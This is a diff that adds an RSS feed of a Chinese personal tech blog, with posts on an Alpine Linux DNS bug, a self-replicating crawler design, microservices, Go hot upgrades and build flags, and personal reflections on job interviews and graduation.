@@ -1,0 +1,1883 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on wrfly&#39;s blog</title>
+    <link>https://wrfly.kfd.me/posts/</link>
+    <description>Recent content in Posts on wrfly&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 06 Dec 2017 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://wrfly.kfd.me/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>alpine-DNS-problem</title>
+      <link>https://wrfly.kfd.me/posts/alpine-dns-problem/</link>
+      <pubDate>Wed, 06 Dec 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/alpine-dns-problem/</guid>
+      <description>Many softwares use alpine as their run-time base image.
+Recently I set up a docker registry with portus as its front. But I came up with a problem that, registry won&amp;rsquo;t post date: 2017-12-06 title: alpine-DNS-problem
+Firstly I thought it was a bug of docker resigtry, but as I&amp;rsquo;m digging into its code, I found that it&amp;rsquo;s actruely a bug of alpine linux. Alpine linux doesn&amp;rsquo;t have an /etc/nsswitch.conf config file.</description>
+    </item>
+    
+    <item>
+      <title>系统设计</title>
+      <link>https://wrfly.kfd.me/posts/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</link>
+      <pubDate>Mon, 27 Nov 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</guid>
+      <description>引子 事情还要从大三说起，当时不知道哪里来的想法，可能是知乎刷多了，又联合了一个“六度分隔理论”，就想爬取知乎上所有人的关注和被关注数据，看是否能够验证一下这个理论。当时也就脑子一热，只是想完成这件事情，但没有考虑过具体怎样完成。
+然后等到毕业设计的时候，这个想法又在脑子里闪过，不过想着由于工程量太大，就换了另外一个设计，是结合实习期间看到，学到的一些东西，做了一个能够运行的系统，现在也考虑要不要放出来，或者等以后有时间再打磨一下API再放出来。这都是后话了。
+真正的开展，还要到三个月前，我找工作的那两周。那个周末被CMGS帮忙内推了几家公司，等面试的时间也怪无聊的，就把这个想法捡了起来，毕竟一个月的工作，还是跟着CMGS学了一些工程上的东西的（咱就像是海绵，到哪里都能吸两口）。
+那这个系统是什么呢？
+简单的说，是一个爬虫。复杂的说，是一个可以自我复制的爬虫。
+我其实并没有深入了解过一般爬虫的实现方法，但大体推测，也无外乎是抓取页面，分析链接，然后顺藤摸瓜，如此反复。这样就会有一个问题，我要放出多少只爬虫，才能够满足我的需求？像搜索引擎这种级别的，他们资源多，放出去的虫子也多，基本可以无限制的爬来爬去。但如果是个人性质的，针对某一个站点，有筛选过滤策略条件的，而且还要充分利用资源，那就得好好琢磨一下了。
+一个大胆的想法。
+为什么不能让爬虫学习一下鸣人，可以自我复制呢？
+我放出去一个蜘蛛，抓取 kfd.me 这个站的所有页面，母蜘蛛发现了 &amp;ldquo;kfd.me/a/&amp;ldquo;，然后分裂一个小蜘蛛去爬 &amp;ldquo;kfd.me/a/*&amp;ldquo;，自己再去寻找，子蜘蛛此时如果发现了&amp;rdquo;*kfd.me/a/a1/*&amp;rdquo; 那么这个蜘蛛再次分裂，产生一个新的蜘蛛去抓 &amp;ldquo;kfd.me/a/a1/*&amp;ldquo;，自己去寻找 &amp;ldquo;kfd.me/a/*&amp;rdquo; 其他的URI。
+这个分裂过程，可以是fork，等系统资源差不多了，再去远程调用创建一个新的蜘蛛，远程调用的方式可以是对进程的调用，也可以直接创建一个容器，利用kubernetes，docker swarm或者CMGS做的eru-lambda，总之能够在集群资源中创建新的容器的调度系统就可以。
+这样一来，只要我们有充足的资源，那这个蜘蛛分裂的过程就可以一直下去，也不必考虑循环问题，因为每个蜘蛛都有自己的作用域，或者说抓取的范围，不是他的地盘，他不会操心，而等到蜘蛛抓取完自己地盘里的信息了，就自杀，释放集群资源。
+子子孙孙无穷尽也。
+系统设计 前面罗嗦了那么多（真不愧是话唠），终于到正规了。
+那如何设计一个这样的系统呢？
+我认为，世界上大部分的事情，都是相通的。自然界中的事物，现象，人类可以学习并应用到自己的生活中。而人类社会中，经过历史验证过的流程，设计，理念也同样可以应用在系统设计方面。
+比如说流水线作业，比如说我们的等级制度，比如说我们的通信流程。
+流水线作业可以对应微服务架构；社会等级制度可以对应系统中的等级划分（主从结构，或者其他的结构）；通信流程可以对应系统中的网络划分（子网掩码对应不同省份的区号，集团内部网络可以理解为自制域）。等等等等。
+所以，在设计系统的时候，我感觉，应该跟建一座工厂，或者建立一支军队差不多。都是利用一些资源，去完成我们的目的，或者提供某种服务。
+工厂里有机器，有工人，有宿舍，有老板，还有洗手间，工作车间，秘书，经理，各种各种；军队又分军种，分武器，分等级，分战区，分连队，分部门，组织精密，等级森严。
+那么一个系统呢，系统中也要考虑网络架构，存储，通信，日志，跨区域服务，分不同的组件，资源调度，资源监控，还要考虑机器的成本，维护的成本（相当于后勤部门），还有项目管理，配置管理，问题追踪，告警处理等等等等。乍一听很庞大，是的没错，因为我说了一大坨，但如果我们条理化呢，每种角色都分门别类呢。一口吃不成个胖子，一天也设计不出一套系统。
+其实冯诺依曼的体系已经经过了历史的验证，至少目前还没有更好的架构出现。那么我们就可以参照着来啊，比如说一台计算机，要有CPU，内存，网卡，硬盘，显卡，主板，声卡，电源，那么系统中就要有，调度器，运行时环境，网络，存储，监控，日志，整体构架，告警系统，宿主机系统。
+调度器可以理解为对系统的整体掌控，对业务应用的调度和计算；运行时环境可以理解为Python，JVM，Docker；网络可以分为区域网络，服务网络；存储又有分布式存储，文件存储，数据库，消息队列，文件共享；监控就是对系统中各个组件的监控（包括负载，性能，各种指标）；日志则是收集各个组件产生的日志文件；整体架构，则是对于系统而言，是不是方便扩展的，是不是方便调试的，有没有容灾，可不可以拆分，解耦做得好不好，备份恢复方案做的怎么样；告警系统则是在某个环节中出现错误时，能不能即使有效准确的通知到上级（也就是我们），能不能让人迅速定位问题，解决问题；宿主机系统则是这个“系统”运行在哪里，是Windows还是Linux，是Ubuntu还是CentOS，是Andriod还是iOS。
+理清楚了，就可以开始干活了。
+拿我的spider来说，单就角色划分而言，可以有四种角色：
+ discover：发现新大陆，只负责找人 worker：抓取分析找到的人的信息，苦力活 monitor：监控worker的工作，万一有占着茅坑不拉屎的，就给干掉；也会监控discover和watcher，万一有哪个gg了，重启一下他们 watcher：检测某一个用户的动态，更新数据库中内容 boss：monitor向其汇报，它再汇报给我  当然这中间还要考虑其他的很多问题，比如说网络怎么弄（现在看来，可以用gus-proxy作为代理），角色之间信息传递通过什么（消息队列，etcd，DB选型），监控策略是什么，如何将数据展示出来等等。discover和worker如何分身，watcher如何分身，他们之间怎么互相通信（可以参考蚂蚁，两两通信，然后慢慢扩散，但是又有时效性的问题）。
+所以真的是一件很庞大的事情。
+组件设计 个人感觉，设计这个东西就是一个大事化小，小事化了的过程，一个系统提供复杂的服务，满足复杂的需求，完成复杂的任务，而系统中的组件就是将复杂的任务拆分，并一点点完成的小蚂蚁。虽然说是蚂蚁，但是也有基础的功能，最简单的，输入和输出。
+其实任何东西都可以理解为输入和输出，典型的就是函数，要有参数和返回值，当然也可以没有返回值，没有那就是空，返回值为空，当然，参数也可以为空。许多函数累加，就会变成一个程序，这个时候，输入和输出就变得复杂了起来，但拆开来看，还是有输入和输出的，只是很细了而已。
+既然一个组建是有输入和输出组成的（大体上），那么这样看起来就简单多了。比如说上面提到的 *discover*，就是一个发现新用户的组建或者成为程序（但程序的话，也是一些程序，毕竟discover不会只有一个，而是以集群的形式存在，对外展现是输入和输出，对内而言是一个组件），他的输入是知乎的网址，输出是新发现的用户。
+怎样让这个程序变成一个集群，从而成为系统的一个组件呢。比如，某个discover发现了一个用户，他怎么知道是新用户，而不是已经被别人发现过的呢。当然可以将每个discover发现的用户保存到一个共享的数据库中，然后每次查询的时候，如果发现已经被人发现过了，那就不查了。但能不能有这样一种思路，就是，每个discover的发现，对自身而言都是新大陆，重复发现并不会对现有的数据产成影响，派出去的discover越多，重复发现的概率虽然也会增大，但是我们发现的新用户也会越多，而且，还可以定义discover回家的规则，即如何让一个discover停下（关于停止，可以采用命令发布的模式，每个discover接受中央发出的指令，也可以采用discover主动领取圣旨的模式，衡量自身是否满足停止的条件，然后自行判断：这两种模式没有本质的区别，都是中央集权）。
+（忽然想到一句话，从知乎某个大V那里看来的，说，“如果你在行动之前想清楚要怎样做，已经超过80%的程序员了”，很有道理。）
+把组建抽象为输入和输出，但每个组件不可能只有一组输入输出，他可能会有别的功能，这个时候就需要把每一对输入输出抽出来，在脑子里形成一个清单，然后一点一点实现。当然，最好能够一次性把需求列完成，这样可以避免以后的大改动，抽象程度也会更高一点。但，这好像是不可能的，我们的需求不可能一成不变，组件的功能也不可能不会增加，这就需要我们组件内部的耦合性要低。当我们把系统拆开的时候，其实就是在解耦了，现在我们要把组件拆开，也是对组件的解藕。
+系统的解藕对于系统功能的扩展和规模的扩展都有好处；组件内部的解藕，对于程序员而言，则是很关键和必要的事情，能省下以后不少的麻烦，开发人员节省出来的时间，对于公司而言就是节省金钱。
+解藕意味着抽象，拆分，但也不能把程序拆的七零八散，把系统弄得超级复杂。Simple is good。
+后语 这篇文章跨了两天的时间，思路有点断。
+原本这里想说一下对于程序设计的看法，然而鄙人有点懒，等想起来再说好了。
+就酱。</description>
+    </item>
+    
+    <item>
+      <title>拆拆拆</title>
+      <link>https://wrfly.kfd.me/posts/%E6%8B%86%E6%8B%86%E6%8B%86/</link>
+      <pubDate>Thu, 19 Oct 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%8B%86%E6%8B%86%E6%8B%86/</guid>
+      <description> 程序的拆拆拆 敏捷开发 &amp;amp; 快速迭代 去年实习的时候就听过这两个词，很时髦，很新颖。大体的理解就是，因为创业公司技术壁垒很低，大家都争分夺秒，所以新功能的开发必须要快，一个新的特性开发出来之后，进入一个快速迭代的流程，其实也就是开发-测试-发布的一个流程，通过自动化的手段，将人为干预降到最低，把从代码到交付这个流程贯通起来，快速上线。
+技术壁垒这个东西，无非就是时间壁垒。曾经面试的时候跟一个创业公司的CEO聊过，他也给我灌输了这一点，当时我问他产品有没有壁垒，他就很坦然的说，半年。以一个时间跨度去衡量技术跨度，我觉得OK。同样一种服务，厉害一点的团队，可能半年开发完，那一般一点的团队，一年，一年半也能写个差不多。日光底下又没有新鲜事，无非就是写的好坏的问题嘛，但这些都可以通过优化，重构去解决。好的代码是重构出来的，我很同意这句话。
+而敏捷开发，我理解为，拆拆拆。从定义上讲：
+ 敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态。
+ 项目的概念，可以是一个单纯的project，工程上的的projet，交付的产物是一个程序；但从项目经理的角度出发，一个项目则是可以给用户带来价值的一组服务。所以这里有点模糊，但我个人理解，项目就是repo，服务就是service，两者可以联系在一起，也可以不联系在一起，一个repo可以就是一个service，但也有可能是一个service的一部分。其实结合docker的stack和container的关系，就容易理解：stack中定义一组container，一个stack对外提供服务，但一个container组成的service也可以看作为一个stack。
+敏捷开发即将原先的大项目拆分成一个一个的小项目，不同的小项目组合起来就是这个“大项目”，即“服务”。但也有可能，这个“大项目”也只是某个服务的一部分。小项目之间互相独立，只要定义好接口，不关心内部实现。这样就能以程序解耦为基础，在人员上解耦，大家互相独立的开发，写好需求，写清楚需求，这个IO流就跑起来了。
+其实程序嘛，无非就是个IO，给个输入，程序给出输出。只不过大程序完成了很多事，小程序只做一件事而已。
+也谈微服务 近些年，“微服务”这个词也挺时髦的。很幸运，一开始去的公司比较时尚，由于是做Docker服务的，所以接触Docker也还不晚。而Docker和微服务，我个人认为是紧密联系在一起的。
+什么是微服务。我们知道服务是对外提供功能的一组程序，一个服务，或者说，公司的一组业务，是由很多不同的组件构成的，那微服务就是在组件这一个层次上（组件可以理解为特定的程序），把组建拆拆拆，把程序拆开，每个组件对外还是相同的功能，但是对内而言，已经七零八散了。在微服务构架里，“七零八散”并不是个贬义词，看似很小的程序在逻辑上都是有组织有纪律的。忽然又想起微信小程序了，看来总体的发展趋势还是微小化，一开始是服务器，虚拟机，后来有了虚拟空间，再后来GAE，SAE，Docker，还有亚马逊的lambda服务，大家都是朝着微小化的方向发展，我们把机器拆开，服务拆开，接口拆开，程序拆开，进程拆开，函数拆开，最后都变成一个个的IO。
+就像是从一家家的小作坊，变成了工厂的流水线，每个人负责单一的功能，每个人都是对外提供一种服务，但由于这个服务比较小，所以就叫微服务。小作坊和工厂都是服务，不同的是，工厂的资源高度集中，工人稳定可靠（不会因为不上班而DOS），流水线分工明确，产品可追溯，流程可控制。一群工人组成的team，就像一群微服务组成的集群。
+说到集群，就不得不说管理和调度，这也是一门博大精深的学问，可以看下google的borg系统。还有集群的监控，日志，存储，网络等等等等。又想起那天去头条面试的时候，那个老大问我对成千上万的容器怎么监控，metric有哪些，当时我竟然脑子短路，只说了alive这一个，哪怕uptime呢，最后他告诉我，还要有对请求的统计（可能是他就说了这一个，也有可能我只记住了这一个）。不过现在手头正做一个API的服务，audit啊，auth啊，cache啊，metrics啊，很涨经验。
+拆拆拆 这个也是今天想到的，从程序分层，想到组件（component）分层，然后又回到了微服务。程序的分层，就是在逻辑和代码上做内部的解耦，不同的DAO，不同的Handler，不同的Type，都要一一区分，能抽象的都抽象，能解耦的都解耦，这样的好处是，在逻辑上很清晰，在测试方面也容易进行单元测试。
+又想到一个“传递和全局变量”的问题。其实一直在纠结，因为程序经常会与数据库打交道，也就是DAO的处理，初始化handler的时候，到底是将new出来的DAO传递进去，还是在DAO中定义一个全局变量，当有handler需要与数据库交互的时候，直接调用这个全局变量呢。我代码看的也少，不了解别人是怎么做的，但经讨论认为，如果说DAO的session或者client能够保证并发安全，那么这个全局变量是没问题的。如果不能保证并发安全，那么就要么加锁（或者队列），要么就再new一个新的出来给handler用。这就要具体情况具体分析了，像influxdb的UDP的client，就可以每次调用的时候new一个出来。但既然其HTTP的client能够保证并发安全，那么全局变量的做法也是OK的。
+拆程序不仅在逻辑上的分层很清晰，在流程上的层次也很明确。以后有新的功能开发，直接找到对应的module或者handler或者别的什么名字，在其基础上append代码就可以，如果有其他地方的改动，也只是小修小补，只要做好feature的unit test，其他的改动也不会有问题。
+如果一个程序让人读起来很乱，那么就需要考虑重构，内部解耦，划分好调用层次，流程顺序等等。
+实在不行，就重写吧。
+扩展阅读  https://www.biaodianfu.com/tencent-agile.html http://agilemanifesto.org/iso/zhchs/principles.html 解析微服务架构 http://wiki.mbalib.com/wiki/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91  </description>
+    </item>
+    
+    <item>
+      <title>20170908</title>
+      <link>https://wrfly.kfd.me/posts/20170908/</link>
+      <pubDate>Fri, 08 Sep 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20170908/</guid>
+      <description>发现近来话越来越多了，不知道是好事还是坏事。
+但频繁的更新blog，却没有什么干货，难免有些罪恶感。
+whatever，写给自己。
+八月中旬“辞职”以后，空窗了两周，然后现在也快入职两周了。不得不感叹光阴似箭。
+喜欢新的工作。也喜欢我的X1C。不烫手。
+前两周还是第一次经历正式意义上的找工作，因为之前的实习经历也好，面试经历也好，都太顺风顺水了，毫无挫折，有如探曩取物。导致我对自己的评价过高，没能赶上预期。不过这也不是坏事，最终还是吃到了喜欢的巧克力，而且中间还去了故宫玩，去了颐和园，回了趟家，办了护照哈哈哈，事儿好多啊。然后还趁着没工作，着手自己的“分布式爬虫”，直到现在才完成了一个proxy，但鄙人感觉这东西还是很有用的，作为一个spider的组件。
+好像对自己还是没有一个清晰的定位，但从做过的事情来看，也就属于platform这一组了，运维开发啊，搞点小事情啊，监控告警啊，集群分布式啊，balabala。好像，离黑客这条路是越来越远了，不过现在国家打的这么严，买个ss都被判刑，咱还是老实点吧。
+总结一下前一个月的工作，跟着老大完成了core，主要工作量是补全了测试 :D 然后在做工程方面有很大的提升，全局观也开始形成了，导致在新的公司总想找事情做…… 写代码就跟写文章似的，也需要推敲琢磨，三天一重构这句话不是白说的。工作的过程，也就是提升自己的过程。有时候迫于某些原因在当时那样实现，但几天之后发现又有新的思路，那么就得refactor了，这样经过时间的沉淀，最终得到的可以说是一件工艺品，艺术品，而不仅仅是工具了。
+ 优秀的工程师同样是优秀的艺术家，有些艺术家的作品是挂在墙上的，有些艺术家的作品则跑在进程里。 &amp;mdash; 我。
+ 经历了两个多月的不明不白之后，终于藕断丝也断了。感情这种事情，跟工作一样，都是强求不来。工作的话还可以用薪水来补平内心的不满，但异地恋这种事情，唉。：（ 虽然说不要隔着屏幕对另一个人产生好感，但，希望我能找到更可爱更适合我的妹子吧 ：）
+然后还闲的没事儿临摹了一个shadowsocks-qt5的 logo： http://wrfly.kfd.me/file/ss-qt5.svg 很清楚。
+越来越觉得没地方去了，游戏也就那样，kill time而已，想去吃好吃的，但一个人总有些奇怪，都没个倾听的对象。国庆放假也买不到回家的票，回家能干什么呢，今中午薄哥说他认识个黄牛大哥，我想等计划好回家之后可以问问。好久没有在家过中秋节了，去年的中秋节晚上跟她还吵架了，历历在目啊唉。哦对，我还想着攒钱，每个月3k如何。也在考虑给爸妈买个养老保险之类的，或者等再工作一段时间之后？原先觉着zhihu啊，v2ex啊，都是很好的论坛，现在的话，只剩1024了。zhihu广告越来越多，v2ex上喷子和三观不合的人也越来越多了。我要找下一个可以刷时间的地方了，kindle？好主意。也想去星巴克坐一下午，那边网应该不差吧。
+短期内的目标是完成工作任务，除了工作的目标，继续完成我的“分裂式”爬虫？然后搞一个关系网出来。
+数据很有趣，系统很有趣，创造很有趣。我未来的女朋友也很有趣。</description>
+    </item>
+    
+    <item>
+      <title>面试有感</title>
+      <link>https://wrfly.kfd.me/posts/%E9%9D%A2%E8%AF%95%E6%9C%89%E6%84%9F/</link>
+      <pubDate>Wed, 16 Aug 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E9%9D%A2%E8%AF%95%E6%9C%89%E6%84%9F/</guid>
+      <description>这两天面试了两家公司。
+周一是头条。赶了一小时的路，等了二十分钟面试官。一面的时候，说了一下我的简历，我做的项目，考了一个小程序，虽然也不能work，但勉强通过吧。二面问了全排序，然后g掉了。中途还在他们食堂混了顿饭，其实也没吃饱。写代码的中途去了两次厕所，有点尴尬。
+的确是一家技术氛围很强的公司，人员也很专业，前台，面试会议室，食堂，都很不错。唯一可惜的就是我水平不行，连个递归都手写不出来。
+周二是知乎，安全岗。同样是一个小时路程，但是在那边等了半小时HR，上楼之后感觉又随便拉了个人来面试，然后等他五分钟联网。然后自我介绍那一套。可能那个小哥面试经验不足，也可能是人家太忙吧。感觉自己回答的都不好。应该也是g掉了。
+唉唉唉，给老大丢脸了。
+情况就是这么个情况。今天没有收到摩拜的面试通知，明天去故宫登一波基。
+其实我很好奇，为什么面试官都不会事先看一下简历，问了一下知乎的小哥，也没有很清晰的回答我，大概的意思是，他们很忙，时间成本。
+但招人本来就是要成本的呀。
+白白浪费掉简历上的链接。哦对，知乎连纸质版的简历都没准备，看来是真的忙。
+难以想象怎样才能在很短的时间展示自己，也不明白怎样在这么短的时间内了解一个人。面试也是门技术活。
+人嘛，都是有长有短，咳咳，我是说，长处短处。
+不善言谈的人，或者不善表达自己的人，比如我？就感觉很吃亏了，相比那些能够很好的表达自己的人，其实这也是能力的欠缺。唉唉唉。
+我原本想着，我这github更新的频率，blog上的有的没的，简历上的项目和实习/工作经历，应该能打动一部分人吧。还是高估自己了。
+也难怪，毕竟没有这么正式的面试过。太过自信，以致自负。
+真的有点水了我。
+但话又说回来，不能妄自尊大，也不能妄自菲薄呀。
+找工作哪有那么容易嘛。
+实习的面试可能是allen想给我个机会；工作的面试可能是跟老大聊得来，他看我可以栽培。
+但真正这样正式的面试，我还是第一次。之前也没人考过我算法和数据结构呀。怪自己不行。如果能够好好的review一下自己写的，说不定哈，就可以通过头条了。但我也好像没有很惋惜的样子，感觉还是有点不合适。我是很喜欢解决问题，但我好像没有能力用那些算法什么的解决。
+至于安全方面，虽然说是科班出身，但学到的东西寥寥无几，人家考你sqlmap的源码，我是真心没看过。也就凭兴趣搞站，遇到问题了，搜一下。如果是izy或者lcy的话，他们应该很容易就过了吧。
+找到一个合适的工作不容易。感觉每个人都是带有一定的自身属性的，放在这里就OK，放在那里就不行。
+也是需要锻炼学习一下怎样表达自己，面试官，绝大多数面试官，都可能是临时拉来的，你要让他相信你的能力，或者说了解你的能力，并非易事啊。
+要说自己会干什么，还得看你让我干什么。不会的东西，一周，也就学的差不多了。
+面试是一场硬仗，面试的东西很可能在工作中都用不到，因为大家都是面试很基础的，而这些东西，都有现成的代码可以抄，有点悖论的样子。
+所以说啊，如果你也跟我一样要找工作，还是看一下，搜一下前人的面试经历，看一下这家公司的风格，投简历的时候也要慎重，到底符不符合人家的要求。
+再有吐槽的一点就是，你写了github啊，blog啊，他们也就瞄一眼。瞄～
+全凭一张嘴。还有手写代码的能力。
+其实我也很赞同这个手写代码的能力，上面能看出很多问题，但是的话，就算用IDE，也不会一下就跑通，所以这个很考验人。给头条点赞。
+总结一下。
+简历上的github最好加点数字，比如多少个repo，多少次commit，多少行代码。blog里面写了多少文章，从什么时候开始的。感觉这些具体的数字更好衡量一点，不然的话，面试官很可能就一语带过：“哦，还有博客是吧。”不要指望面试官会去看上面写了什么东西。因为他们可能连简历都没打印（逃&amp;hellip;
+面试之前问一下同学或者师兄，看面试官都喜欢问什么，有针对性的弥补一下，因为这些套路都是不变的。有点应试教育的感觉了。
+但不管怎么说，自身实力是最重要的。
+当然也不能因为几家公司的面试失败就断然否定自己，尺有所短，寸有所长？
+心态放平，不着急。</description>
+    </item>
+    
+    <item>
+      <title>热升级</title>
+      <link>https://wrfly.kfd.me/posts/%E7%83%AD%E5%8D%87%E7%BA%A7/</link>
+      <pubDate>Sun, 30 Jul 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E7%83%AD%E5%8D%87%E7%BA%A7/</guid>
+      <description> 什么是热升级 see https://my.oschina.net/astaxie/blog/136364
+我理解的热升级就是更新程序而不需要重启，当然这个重启是宏观上的重启，即不需要重新启动服务器或者服务进程，但从底层来讲，至少子进程还是需要重新启动一下的，毕竟更新了代码。
+典型的热升级是nginx的 upgrade-on-fly
+其原理就是启动两个master进程（一个新版本，一个旧版本），端口复用，同时处理请求，然后再下线旧版本的nginx，这里边要处理的就是保持连接的问题，即不能让旧版本nginx的连接断开，从而影响业务。
+难点与要处理的问题  保持连接（stop-gracefully） 不能断开old version与client建立的连接 无缝衔接（zero-downtime）要保证新的请求都能被new version的binary所处理，不能遗漏或拒绝 资源稳定（分布式资源锁）不能因为新旧版本的处理而导致资源不一致，资源抢占、竞争等问题  第一点和第二点是最基本要处理的，第三点则是业务层面，也就是在程序逻辑层面要保证的。
+保持旧的连接同时转移新的请求给new version，就是要保证old version不退出的情况下，new version接管进程的listenner，golang不支持端口复用，所以只能有转移listenner的fd来实现。不管是master-worker类型的还是endless这种 fork-exec 类型的，都是这种实现。
+现有的解决方案 我知道的开源实现方案有这么几个：
+ https://github.com/facebookgo/grace https://github.com/rcrowley/goagain https://github.com/fvbock/endless https://github.com/jpillora/overseer  其中overseer和endless都是动手实践过的。
+endless的缺点就是，old versino退出之后，新exec出来的进程是一个新的进程，也就是说，脱离的原来的环境而被init进程托管，这个时候如果你用systemd进行进程管理的话，systemd就会认为其已经dead了。
+所以如果想采用endless的话，就要像nginx那样，用fork的方式启动进程，即启动之后fork一份，然后主进程退出，同时维护一份pid文件，告诉systemd这样的进程管理工具，他的pid是谁，还活着没。
+而overseer则属于master-child这种类型，一个master负责检查是否有更新，有的话就新fork一个进程出来，转移所有的env，listenner，args等。上层来看，程序还是那个程序，但是负责处理请求的进程则换成了新的child进程。
+两者相同的地方就是对于请求的处理，都在accept层面放了计数器（不然就没法知道还有多少个连接了）从而实现graceful stop。
+然后 思来想去，还是overseer比较适合，相当于在上层加了一个handler，然后我给加了一个file的fetcher：
+https://github.com/wrfly/overseer
+看来大家都很忙，owner说是要给瞅瞅，但这么久了那个PR还没合。 当然，我也不介意别人用我的namespace hhh
+参考资料  https://my.oschina.net/astaxie/blog/136364 https://fitstar.github.io/falcore/hot_restart https://grisha.org/blog/2014/06/03/graceful-restart-in-golang/  </description>
+    </item>
+    
+    <item>
+      <title>go程序依赖问题</title>
+      <link>https://wrfly.kfd.me/posts/go%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Tue, 04 Jul 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/go%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</guid>
+      <description>今天遇到一个问题就是，在centos下build出来的golang程序能不能直接放到alpine上面运行。
+实际测试发现，有的可以，有的不可以。
+原因与直觉相同，因为二者系统的动态链接库不同，alpine用了精简版的libc，不是glibc。
+如果build binary的时候没有用到系统的依赖，那么则不会出现依赖性问题。
+解决方法有两种，在build的时候：
+ go build -ldflags &amp;ldquo;-s -w&amp;rdquo; -a -tagsnetgo -installsuffix netgo
+ CGO_ENABLED=0 go build -ldflags &amp;ldquo;-s&amp;rdquo; -a -installsuffix cgo .
+  见：
+ &amp;lt;http://www.jeffsloyer.io/post date: 2017-07-04 title: go程序依赖问题 https://stackoverflow.com/questions/36279253/go-compiled-binary-wont-run-in-an-alpine-docker-container-on-ubuntu-host  </description>
+    </item>
+    
+    <item>
+      <title>匆匆</title>
+      <link>https://wrfly.kfd.me/posts/%E5%8C%86%E5%8C%86/</link>
+      <pubDate>Wed, 24 May 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%8C%86%E5%8C%86/</guid>
+      <description>时间 忘记在哪里看到的了，说，不同的年龄对时间的感知程度是不一样的，小孩子觉得一天很漫长很漫长，起床，穿衣服，吃饭，上厕所，上学，上课，下课，课间操&amp;hellip;一天简直太长了，晚上回去还要吃饭，写作业，看电视，天天盼着什么时候才能长大。但是到了老年，每天就起床，吃饭，睡觉，一天啥都没干就已经结束了，总想盼着时间过得慢一点。
+之前一直不能理解这些话，但临近毕业，我越发感受到，时间，真的过得太快了。
+四年的时间，感觉剧情都没有一部电影长。但总归是经历了那么多东西。罗列的话，军训，上课，考试，放假，开学，爬山，聚餐，火锅，唱歌，熬夜，日站，看书，动漫，追剧，失恋，认识新的人，实习，晒太阳，漫无目的的散步，写代码，做项目，搞网站，写博客，林林总总，乱七八糟的。
+我甚至还记得当时选大学选专业的那些日子。甚至还记得熬夜去走廊写高数作业，然后碰到一个莫名的人来巡视；熬夜日站，想尽各种方法手段去搞别人；熬夜写代码赶需求，快速迭代，敏捷开发？；不吃不喝打比赛，虽然根本没什么名次，但的确接触到不少新东西。历历在目却又如白驹过隙。
+大一的时候在墙上贴的那些励志的话也都悉数褪尽颜色，还有那些罗列的书单，笑哈哈，就看了两本。
+ 想想你在做什么，你该做什么，你要做什么。
+你永远不知道未来的你有多强大。
+不要碌碌无为，不要劳而无获，不要虚度光阴。
+专注一件事，做到底。
+ 还有最最重要的一条：
+ 永远记得备份数据！
+ 可怜的，宝贵的，该死的时间。
+规划 今天去帮同学做攻击测试，然后被问到如何确定自己的方向。233，我上个月选择offer的时候还问过别人，现在就要以 elder 的身份去给别人解惑了。
+忽然想起新华字典里有这样一个例句：“张华考上了北京大学；李萍进了中等技术学校；我在百货公司当售货员：我们都有光明的前途。”
+换到大学毕业，那就是：“张华考上了研究生；李萍去了创业公司写代码；我在某个公司干销售：我们都还活着。”
+感觉，这不是我们的计划啊，我们的目标不是星辰大海吗。
+屁，房子都买不起，星什么辰，大什么海。
+人啊，活着最重要，至于开心的话，排第二位吧就。
+初步总结了一下程序员的发展之路：应届生→初级程序员→中级程序员→高级程序员→初级架构师→中级架构师→高级架构师→CTO→买房。
+中间任何环节都可能分叉，转行去做销售什么的，或者回家开饭店。其实我倒是挺想开饭店的，人总归是要吃饭的嘛，如果将来AI取代了某些程序员的位置，那我就还能有点家产。其实在学校开店也可以，手机贴膜啊，复印店啊，旧书店啊什么的。但是日子又太无聊了。唉。人活着，或多或少，都是有些苦恼的。比如，晚上吃啥。
+有件事情我一直在权衡，兴趣和工作是绑定到一起的吗。可以把兴趣发展成工作，还是说，可以把工作演变成兴趣？但兴趣是真的好玩，工作的话，就不一定了。二者之间，要说想通的地方，成就感？兴趣可以使我愉悦，工作可以使我获得薪水，都可以从二者中获得成就感，当然，如果有成就的话。
+所以啊，对于我来说，信息安全是个兴趣，但不一定要发展成工作，不然有可能我会丢失我的愉悦；但工作一定不能是枯燥无味和重复的，否则我就没有成就感。我未必会从兴趣中获得报酬或者薪水，但从工作中，一定不能不开心。（对没错，这就是离职的理由之一。）我的工作可以是开发，可以是运维，可以是救火队员，但我一定要把这些事情玩出花儿，不能日复一日的熬，一天一天的撞钟。真的，太无聊，那样。但是有一种人就特别厉害，兴趣和工作完美的结合到了一起，干活就跟玩儿一样，爽歪歪，太羡慕。
+但有些人就不一样啊，他们喜欢安逸和稳定和不出问题，每天虽然做着重复的事情，但下班后的悠闲就会弥补这些不愉快。所以这些人生也不能说是没意思。
+某种意义上讲，我还挺奇葩的，我喜欢出现问题，然后解决问题，但又不喜欢同样的问题，because this makes me angry. 也不会说别人爱听的话，lonely.
+再回到解惑上去。
